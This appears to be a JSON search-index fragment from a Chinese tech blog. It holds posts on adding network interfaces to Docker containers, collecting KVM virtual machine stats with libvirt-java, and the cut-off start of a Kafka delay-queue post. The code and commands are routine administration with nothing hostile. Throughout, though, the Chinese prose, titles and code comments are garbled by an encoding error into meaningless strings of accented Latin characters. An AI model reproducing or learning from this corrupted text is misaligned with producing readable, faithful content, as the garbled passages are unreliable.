æ–°ç‰ˆdockeræ–°å¢äº†ipvlanã€macvlanå’Œoverlayç±»å‹çš„ç½‘ç»œï¼Œä¸»è¦æ˜¯ä¸ºäº†å¤šå°å®¿ä¸»æœºå™¨ä¸Šé¢çš„dockerå®¹å™¨éš”ç¦»ä¸é€šä¿¡ï¼Œåº•å±‚ç½‘ç»œå¤æ‚äº†å¾ˆå¤šï¼Œä¹‹åæˆ‘ä»¬ä¼šå•ç‹¬å¯¹å…¶è¿›è¡Œä»‹ç»ã€‚\næœ€åä¹Ÿä¸è¦å¿˜è®°æ¸…ç†å®éªŒç¯å¢ƒå“¦ã€‚\n# åˆ é™¤ç½‘æ¡¥ ip link del br0 # åˆ é™¤veth pair ip link del veth0-br # åˆ é™¤è½¯è¿æ¥ rm -rf /var/run/netns/28dc2e8853df # åˆ é™¤å®¹å™¨ docker rm 28dc2e8853df -f ","permalink":"https://www.typesafe.cn/posts/how-to-add-port-for-docker/","summary":"\u003cp\u003eä¹‹å‰æˆ‘ä»¬ä»‹ç»\u003ccode\u003eNetwork Namespace\u003c/code\u003eï¼ˆä»¥ä¸‹ç®€ç§°\u003ccode\u003enetns\u003c/code\u003eï¼‰å’Œ\u003ccode\u003eveth pair\u003c/code\u003eæ—¶è¯´è¿‡\u003ccode\u003edocker\u003c/code\u003eæ˜¯ä½¿ç”¨è¿™äº›æŠ€æœ¯æ¥å®ç°çš„ç½‘ç»œéš”ç¦»ï¼Œä»Šå¤©æˆ‘ä»¬å°±æ¥ä¸€æ¢ç©¶ç«Ÿï¼Œçœ‹ä¸‹\u003ccode\u003edocker\u003c/code\u003eåˆ°åº•æ˜¯å¦‚ä½•åšåˆ°çš„ã€‚\u003c/p\u003e\n\u003ch3 id=\"å¯åŠ¨ä¸€ä¸ªæ— ç½‘ç»œçš„å®¹å™¨\"\u003eå¯åŠ¨ä¸€ä¸ªæ— ç½‘ç»œçš„å®¹å™¨\u003c/h3\u003e\n\u003cp\u003eé¦–å…ˆæˆ‘ä»¬ä½¿ç”¨ \u003ccode\u003e--net=none\u003c/code\u003e å‚æ•°å¯åŠ¨ä¸€ä¸ªæ— ç½‘ç»œçš„å®¹å™¨ï¼Œä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº†\u003ccode\u003ecentos\u003c/code\u003eé•œåƒã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker run -itd --name centos-test --net\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003enone centos\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¯åŠ¨æˆåŠŸä¹‹åæˆ‘ä»¬è¿›å…¥å®¹å™¨å†…éƒ¨ç¡®è®¤ä¸€ä¸‹æ˜¯å¦æ— ç½‘å¡ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eroot@localhost ~\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e# docker ps\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCONTAINER ID   IMAGE          COMMAND       CREATED          STATUS          PORTS     NAMES\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e28dc2e8853df   centos         \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/bin/bash\u0026#34;\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e24\u003c/span\u003e seconds ago   Up \u003cspan style=\"color:#ae81ff\"\u003e23\u003c/span\u003e seconds             centos-test\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eroot@localhost ~\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e# docker exec -it 28dc2e8853df bash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eroot@28dc2e8853df /\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e# ip a\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu \u003cspan style=\"color:#ae81ff\"\u003e65536\u003c/span\u003e qdisc noqueue state UNKNOWN group default qlen \u003cspan style=\"color:#ae81ff\"\u003e1000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    inet 127.0.0.1/8 scope host lo\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       valid_lft forever preferred_lft forever\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¯ä»¥çœ‹åˆ°ç¡®å®åªæœ‰ä¸€ä¸ªæœ¬åœ°ç¯å›ç½‘å¡ã€‚\u003c/p\u003e","title":"å®¹å™¨ç½‘ç»œâ€”â€”å¦‚ä½•ä¸ºdockeræ·»åŠ ç½‘å¡ï¼Ÿ"},{"content":"è™šæ‹ŸåŒ–å¼€å‘ç›¸è¾ƒäºæ™®é€šå¼€å‘æ˜¯ä¸€ä¸ªå†·é—¨çš„æ–¹å‘ï¼Œå¤§å¤šæ•°æ˜¯ä½¿ç”¨Pythonå¼€å‘ï¼Œå…¶ä¸­ä½¿ç”¨Javaæ¥åšè™šæ‹ŸåŒ–çš„å°‘ä¹‹åˆå°‘ï¼Œèµ„æ–™æ›´æ˜¯å°‘çš„å¯æ€œï¼Œä¸ºäº†å®ç°éœ€æ±‚æˆ‘ä¹Ÿæ˜¯è¸©äº†ä¸å°‘å‘ï¼Œä»Šå¤©å°±ä¸ºå¤§å®¶åˆ†äº«ä¸€ä¸‹å¦‚ä½•ä½¿ç”¨ libvirt-java æ¥é‡‡é›†KVMè™šæ‹Ÿæœºçš„èµ„æºä½¿ç”¨ä¿¡æ¯ã€‚\nCPUä½¿ç”¨ç‡ libvirtå¹¶æ²¡æœ‰ç›´æ¥æä¾›è·å–è™šæ‹ŸæœºCPUä½¿ç”¨ç‡çš„æ¥å£ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±æ¥è®¡ç®—ï¼Œç½‘ä¸Šåˆ†äº«çš„ä»£ç æˆ–è€…å…¬å¼äº”èŠ±å…«é—¨ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯é”™è¯¯çš„ï¼Œç»è¿‡æˆ‘çš„æµ‹è¯•ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªç›¸å¯¹å‡†ç¡®çš„è®¡ç®—å…¬å¼ã€‚\ncpu_usage = (cpu_time_now - cpu_time_t_second_ago) * 100 / (t * vCpus * 10^9) Javaä»£ç å¦‚ä¸‹\n// tç§’å‰çš„CPUæ—¶é—´ long c1 = domain.getInfo().cpuTime; Thread.sleep(1000); // å½“å‰CPUæ—¶é—´ long c2 = domain.getInfo().cpuTime; // è™šæ‹ŸCPUæ•°é‡ int vCpus = domain.getMaxVcpus(); // t ä¸º1ç§’ Double cpuUsage = 100 * (c2 - c1) / (1 * vCpus * Math.pow(10, 9)); log.debug(\u0026#34;è™šæ‹Ÿæœº[{}]CPUä½¿ç”¨ç‡ä¸º: {}\u0026#34;, uuid, cpuUsage); å†…å­˜ä½¿ç”¨ç‡ ä¸è¦ä½¿ç”¨domain.getInfo()è¿”å›çš„ memoryå­—æ®µï¼Œè™½ç„¶å®ƒæ³¨é‡Šå†™çš„æ˜¯the memory in KBytes used by the domainï¼Œä½†å®ƒçš„æ„æ€çœŸçš„ä¸æ˜¯è™šæ‹Ÿæœºå†…éƒ¨è¿›ç¨‹å·²ä½¿ç”¨çš„å†…å­˜å¤§å°ï¼Œè€Œæ˜¯ä»å®¿ä¸»æœºå™¨çš„è§’åº¦æ¥çœ‹åˆ†é…ç»™è¿™ä¸ªè™šæ‹Ÿæœºçš„å†…å­˜å®ƒä½¿ç”¨äº†å¤šå°‘ï¼Œå¦‚æœæ²¡æœ‰ç‰¹æ®Šé…ç½®ï¼Œå®ƒä¼šå’ŒmaxMemå­—æ®µçš„å€¼æ˜¯ç›¸åŒçš„ã€‚\næ­£ç¡®åšæ³•æ˜¯ä½¿ç”¨domain.memoryStats(10)æ¥è·å–ï¼Œé‚£ä¸ºä»€ä¹ˆå‚æ•°è¦è¾“å…¥ä¸€ä¸ª10å‘¢ï¼Ÿè¿™æ˜¯å› ä¸º10ä»£è¡¨çš„æ˜¯è¦è¿”å›çš„ä¿¡æ¯æ•°é‡ï¼Œç»è¿‡æˆ‘æ‰‹åŠ¨æ‰§è¡Œvirsh dommemstat uuid æµ‹è¯•å‘ç°æœ‰10ä¸ªå‚æ•°è¿”å›ï¼Œæ‰€ä»¥éœ€è¦å¡«å…¥10ã€‚å¦å¤–å‘½ä»¤è¿”å›çš„unused å­—æ®µå€¼ä¸æ•°ç»„ä¸­tag=8çš„æ•°æ®ä¸€è‡´ï¼Œæœ€ç»ˆæˆ‘ä»¬è·å–åˆ°äº†æœªä½¿ç”¨çš„å†…å­˜å¤§å°ï¼Œè®¡ç®—å†…å­˜ä½¿ç”¨ç‡æ›´æ˜¯è½»è½»æ¾æ¾ã€‚\nJavaä»£ç å¦‚ä¸‹\nMemoryStatistic[] memoryStatistics = domain.memoryStats(10); Optional\u0026lt;MemoryStatistic\u0026gt; first = Arrays.stream(memoryStatistics).filter(x -\u0026gt; x.getTag() == 8).findFirst(); if (first.isPresent()) { MemoryStatistic memoryStatistic = first.get(); long unusedMemory = memoryStatistic.getValue(); long maxMemory = domain.getMaxMemory(); double memoryUsage = (maxMemory - unusedMemory) * 100.0 / maxMemory; log.debug(\u0026#34;è™šæ‹Ÿæœº[{}]å†…å­˜ä½¿ç”¨ç‡ä¸º: {}\u0026#34;, uuid, memoryUsage); } ç½‘å¡æ•°æ®åŒ…ä¿¡æ¯ åŒæ ·libvirtå¹¶æ²¡æœ‰æä¾›è·å–è™šæ‹Ÿæœºç½‘å¡çš„æ¥å£ï¼Œå› æ­¤éœ€è¦è·å–è™šæ‹Ÿæœºçš„xmlæ–‡ä»¶æ¥æŸ¥è¯¢ã€‚\næ­¤å¤„æ²¡æœ‰ä»€ä¹ˆå‘ï¼Œè§£æxmlæ˜¯ä½¿ç”¨äº†htmlè§£æåº“Jsoupï¼Œxmlç®—æ˜¯htmlçš„äº²æˆšå§ï¼Œæ¯”htmlä¹¦å†™ä¸¥æ ¼å¾ˆå¤šï¼Œè§£ææ•°æ®æ›´ä¸ºæ–¹ä¾¿ã€‚\nè·å–åˆ°ç½‘å¡åç§°ä¹‹åå†è·å–ç»Ÿè®¡ä¿¡æ¯ï¼Œå¯ä»¥è·å–çš„æ•°æ®æœ‰ï¼š\nå­—æ®µ å«ä¹‰ rx_bytes æ¥æ”¶æ•°æ®åŒ…å¤§å° rx_packets æ¥æ”¶æ•°æ®åŒ…æ•°é‡ rx_errs æ¥æ”¶é”™è¯¯æ•°æ®åŒ…æ•°é‡ rx_drop æ¥æ”¶ä¸¢å¼ƒæ•°æ®åŒ…æ•°é‡ tx_bytes å‘é€æ•°æ®åŒ…å¤§å° tx_packets å‘é€æ•°æ®åŒ…æ•°é‡ tx_errs å‘é€é”™è¯¯æ•°æ®åŒ…æ•°é‡ tx_drop å‘é€ä¸¢å¼ƒæ•°æ®åŒ…æ•°é‡ Javaä»£ç å¦‚ä¸‹\nString xmlDesc = domain.getXMLDesc(0); Document document = Jsoup.parse(xmlDesc); // ç½‘å¡ Elements interfaces = document.getElementsByTag(\u0026#34;devices\u0026#34;).get(0).getElementsByTag(\u0026#34;interface\u0026#34;); for (Element inter : interfaces) { String interName = inter.getElementsByTag(\u0026#34;target\u0026#34;).get(0).attr(\u0026#34;dev\u0026#34;); DomainInterfaceStats domainInterfaceStats = domain.interfaceStats(interName); log.debug(\u0026#34;dev {} stats {}\u0026#34;, interName, Json.toJsonString(domainInterfaceStats)); } ç£ç›˜IOä¿¡æ¯ å’Œç½‘å¡åŒæ ·ï¼Œlibvirtä¹Ÿæ²¡æœ‰æä¾›è·å–è™šæ‹Ÿæœºç£ç›˜çš„æ¥å£ï¼Œè¿˜æ˜¯éœ€è¦è·å–è™šæ‹Ÿæœºçš„xmlæ–‡ä»¶æ¥æŸ¥è¯¢ï¼Œè·å–åˆ°ç£ç›˜åç§°ä¹‹åå†è·å–ç»Ÿè®¡ä¿¡æ¯ï¼Œå¯ä»¥è·å–çš„æ•°æ®æœ‰ï¼š\nå­—æ®µ å«ä¹‰ rd_req è¯»å–è¯·æ±‚æ€»æ•° rd_bytes è¯»å–çš„æ•°æ®å¤§å° wr_req å†™å…¥è¯·æ±‚æ€»æ•° wr_bytes å†™å…¥çš„æ•°æ®å¤§å° errs å¤±è´¥æ¬¡æ•° Javaä»£ç å¦‚ä¸‹\nString xmlDesc = domain.getXMLDesc(0); Document document = Jsoup.parse(xmlDesc); // ç£ç›˜ Elements disks = document.getElementsByTag(\u0026#34;devices\u0026#34;).get(0).getElementsByTag(\u0026#34;disk\u0026#34;); for (Element disk : disks) { String dev = disk.getElementsByTag(\u0026#34;target\u0026#34;).get(0).attr(\u0026#34;dev\u0026#34;); DomainBlockStats domainBlockStats = domain.blockStats(dev); log.debug(\u0026#34;dev {} stats {}\u0026#34;, dev, Json.toJsonString(domainBlockStats)); } è‡³æ­¤é‡‡é›†è™šæ‹ŸæœºçŠ¶æ€ä¿¡æ¯ç®—æ˜¯å‘Šä¸€æ®µè½ï¼Œå­¦çš„è¶Šå¤šæ‰å‘ç°ä¸ä¼šçš„è¶Šå¤š\u0026hellip;\n","permalink":"https://www.typesafe.cn/posts/collect-vm-stats-by-libvirt-java/","summary":"\u003cp\u003eè™šæ‹ŸåŒ–å¼€å‘ç›¸è¾ƒäºæ™®é€šå¼€å‘æ˜¯ä¸€ä¸ªå†·é—¨çš„æ–¹å‘ï¼Œå¤§å¤šæ•°æ˜¯ä½¿ç”¨Pythonå¼€å‘ï¼Œå…¶ä¸­ä½¿ç”¨Javaæ¥åšè™šæ‹ŸåŒ–çš„å°‘ä¹‹åˆå°‘ï¼Œèµ„æ–™æ›´æ˜¯å°‘çš„å¯æ€œï¼Œä¸ºäº†å®ç°éœ€æ±‚æˆ‘ä¹Ÿæ˜¯è¸©äº†ä¸å°‘å‘ï¼Œä»Šå¤©å°±ä¸ºå¤§å®¶åˆ†äº«ä¸€ä¸‹å¦‚ä½•ä½¿ç”¨ \u003ccode\u003elibvirt-java\u003c/code\u003e æ¥é‡‡é›†KVMè™šæ‹Ÿæœºçš„èµ„æºä½¿ç”¨ä¿¡æ¯ã€‚\u003c/p\u003e\n\u003ch3 id=\"cpuä½¿ç”¨ç‡\"\u003eCPUä½¿ç”¨ç‡\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003elibvirt\u003c/code\u003eå¹¶æ²¡æœ‰ç›´æ¥æä¾›è·å–è™šæ‹ŸæœºCPUä½¿ç”¨ç‡çš„æ¥å£ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±æ¥è®¡ç®—ï¼Œç½‘ä¸Šåˆ†äº«çš„ä»£ç æˆ–è€…å…¬å¼äº”èŠ±å…«é—¨ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯é”™è¯¯çš„ï¼Œç»è¿‡æˆ‘çš„æµ‹è¯•ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªç›¸å¯¹å‡†ç¡®çš„è®¡ç®—å…¬å¼ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-latex\" data-lang=\"latex\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecpu_usage = (cpu_time_now - cpu_time_t_second_ago) * 100 / (t * vCpus * 10^9)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eJavaä»£ç å¦‚ä¸‹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// tç§’å‰çš„CPUæ—¶é—´\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elong\u003c/span\u003e c1 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e domain.\u003cspan style=\"color:#a6e22e\"\u003egetInfo\u003c/span\u003e().\u003cspan style=\"color:#a6e22e\"\u003ecpuTime\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eThread.\u003cspan style=\"color:#a6e22e\"\u003esleep\u003c/span\u003e(1000);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// å½“å‰CPUæ—¶é—´\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elong\u003c/span\u003e c2 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e domain.\u003cspan style=\"color:#a6e22e\"\u003egetInfo\u003c/span\u003e().\u003cspan style=\"color:#a6e22e\"\u003ecpuTime\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// è™šæ‹ŸCPUæ•°é‡\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e vCpus \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e domain.\u003cspan style=\"color:#a6e22e\"\u003egetMaxVcpus\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// t ä¸º1ç§’\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDouble cpuUsage \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e 100 \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e (c2 \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e c1) \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e (1 \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e vCpus \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e Math.\u003cspan style=\"color:#a6e22e\"\u003epow\u003c/span\u003e(10, 9));\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elog.\u003cspan style=\"color:#a6e22e\"\u003edebug\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;è™šæ‹Ÿæœº[{}]CPUä½¿ç”¨ç‡ä¸º: {}\u0026#34;\u003c/span\u003e, uuid, cpuUsage);\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"å†…å­˜ä½¿ç”¨ç‡\"\u003eå†…å­˜ä½¿ç”¨ç‡\u003c/h3\u003e\n\u003cp\u003eä¸è¦ä½¿ç”¨\u003ccode\u003edomain.getInfo()\u003c/code\u003eè¿”å›çš„ \u003ccode\u003ememory\u003c/code\u003eå­—æ®µï¼Œè™½ç„¶å®ƒæ³¨é‡Šå†™çš„æ˜¯\u003ccode\u003ethe memory in KBytes used by the domain\u003c/code\u003eï¼Œä½†å®ƒçš„æ„æ€çœŸçš„ä¸æ˜¯è™šæ‹Ÿæœºå†…éƒ¨è¿›ç¨‹å·²ä½¿ç”¨çš„å†…å­˜å¤§å°ï¼Œè€Œæ˜¯ä»å®¿ä¸»æœºå™¨çš„è§’åº¦æ¥çœ‹åˆ†é…ç»™è¿™ä¸ªè™šæ‹Ÿæœºçš„å†…å­˜å®ƒä½¿ç”¨äº†å¤šå°‘ï¼Œå¦‚æœæ²¡æœ‰ç‰¹æ®Šé…ç½®ï¼Œå®ƒä¼šå’Œ\u003ccode\u003emaxMem\u003c/code\u003eå­—æ®µçš„å€¼æ˜¯ç›¸åŒçš„ã€‚\u003c/p\u003e\n\u003cp\u003eæ­£ç¡®åšæ³•æ˜¯ä½¿ç”¨\u003ccode\u003edomain.memoryStats(10)\u003c/code\u003eæ¥è·å–ï¼Œé‚£ä¸ºä»€ä¹ˆå‚æ•°è¦è¾“å…¥ä¸€ä¸ª\u003ccode\u003e10\u003c/code\u003eå‘¢ï¼Ÿè¿™æ˜¯å› ä¸º\u003ccode\u003e10\u003c/code\u003eä»£è¡¨çš„æ˜¯è¦è¿”å›çš„ä¿¡æ¯æ•°é‡ï¼Œç»è¿‡æˆ‘æ‰‹åŠ¨æ‰§è¡Œ\u003ccode\u003evirsh dommemstat uuid\u003c/code\u003e æµ‹è¯•å‘ç°æœ‰10ä¸ªå‚æ•°è¿”å›ï¼Œæ‰€ä»¥éœ€è¦å¡«å…¥\u003ccode\u003e10\u003c/code\u003eã€‚å¦å¤–å‘½ä»¤è¿”å›çš„\u003ccode\u003eunused\u003c/code\u003e å­—æ®µå€¼ä¸æ•°ç»„ä¸­\u003ccode\u003etag=8\u003c/code\u003eçš„æ•°æ®ä¸€è‡´ï¼Œæœ€ç»ˆæˆ‘ä»¬è·å–åˆ°äº†æœªä½¿ç”¨çš„å†…å­˜å¤§å°ï¼Œè®¡ç®—å†…å­˜ä½¿ç”¨ç‡æ›´æ˜¯è½»è½»æ¾æ¾ã€‚\u003c/p\u003e\n\u003cp\u003eJavaä»£ç å¦‚ä¸‹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eMemoryStatistic\u003cspan style=\"color:#f92672\"\u003e[]\u003c/span\u003e memoryStatistics \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e domain.\u003cspan style=\"color:#a6e22e\"\u003ememoryStats\u003c/span\u003e(10);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eOptional\u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003eMemoryStatistic\u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e first \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Arrays.\u003cspan style=\"color:#a6e22e\"\u003estream\u003c/span\u003e(memoryStatistics).\u003cspan style=\"color:#a6e22e\"\u003efilter\u003c/span\u003e(x \u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e x.\u003cspan style=\"color:#a6e22e\"\u003egetTag\u003c/span\u003e() \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e 8).\u003cspan style=\"color:#a6e22e\"\u003efindFirst\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (first.\u003cspan style=\"color:#a6e22e\"\u003eisPresent\u003c/span\u003e()) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  MemoryStatistic memoryStatistic \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e first.\u003cspan style=\"color:#a6e22e\"\u003eget\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003elong\u003c/span\u003e unusedMemory \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e memoryStatistic.\u003cspan style=\"color:#a6e22e\"\u003egetValue\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003elong\u003c/span\u003e maxMemory \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e domain.\u003cspan style=\"color:#a6e22e\"\u003egetMaxMemory\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003edouble\u003c/span\u003e memoryUsage \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e (maxMemory \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e unusedMemory) \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e 100.\u003cspan style=\"color:#a6e22e\"\u003e0\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e maxMemory;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  log.\u003cspan style=\"color:#a6e22e\"\u003edebug\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;è™šæ‹Ÿæœº[{}]å†…å­˜ä½¿ç”¨ç‡ä¸º: {}\u0026#34;\u003c/span\u003e, uuid, memoryUsage);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"ç½‘å¡æ•°æ®åŒ…ä¿¡æ¯\"\u003eç½‘å¡æ•°æ®åŒ…ä¿¡æ¯\u003c/h3\u003e\n\u003cp\u003eåŒæ ·\u003ccode\u003elibvirt\u003c/code\u003eå¹¶æ²¡æœ‰æä¾›è·å–è™šæ‹Ÿæœºç½‘å¡çš„æ¥å£ï¼Œå› æ­¤éœ€è¦è·å–è™šæ‹Ÿæœºçš„xmlæ–‡ä»¶æ¥æŸ¥è¯¢ã€‚\u003c/p\u003e","title":"ä½¿ç”¨libvirt-javaé‡‡é›†KVMè™šæ‹ŸæœºçŠ¶æ€ä¿¡æ¯"},{"content":"åŸºäºkafkaå®ç°å»¶è¿Ÿé˜Ÿåˆ— kafkaä½œä¸ºä¸€ä¸ªä½¿ç”¨å¹¿æ³›çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¾ˆå¤šäººéƒ½ä¸ä¼šé™Œç”Ÿï¼Œä½†å½“ä½ åœ¨ç½‘ä¸Šæœç´¢â€œkafka å»¶è¿Ÿé˜Ÿåˆ—â€ï¼Œå‡ºç°çš„éƒ½æ˜¯ä¸€äº›è®²è§£æ—¶é—´è½®æˆ–è€…åªæ˜¯æä¾›äº†ä¸€äº›æ€è·¯ï¼Œå¹¶æ²¡æœ‰ä¸€ä»½çœŸå®å¯ç”¨çš„ä»£ç å®ç°ï¼Œä»Šå¤©æˆ‘ä»¬å°±æ¥æ‰“ç ´è¿™ä¸ªç°è±¡ï¼Œæä¾›ä¸€ä»½å¯è¿è¡Œçš„ä»£ç ï¼ŒæŠ›ç –å¼•ç‰ï¼Œå¸å¼•æ›´å¤šçš„å¤§ç¥æ¥åˆ†äº«ã€‚\nåŸºäºkafkaå¦‚ä½•å®ç°å»¶è¿Ÿé˜Ÿåˆ—ï¼Ÿ æƒ³è¦è§£å†³ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦å…ˆåˆ†è§£é—®é¢˜ã€‚kafkaä½œä¸ºä¸€ä¸ªé«˜æ€§èƒ½çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œåªè¦æ¶ˆè´¹èƒ½åŠ›è¶³å¤Ÿï¼Œå‘å‡ºçš„æ¶ˆæ¯éƒ½æ˜¯ä¼šç«‹åˆ»æ”¶åˆ°çš„ï¼Œå› 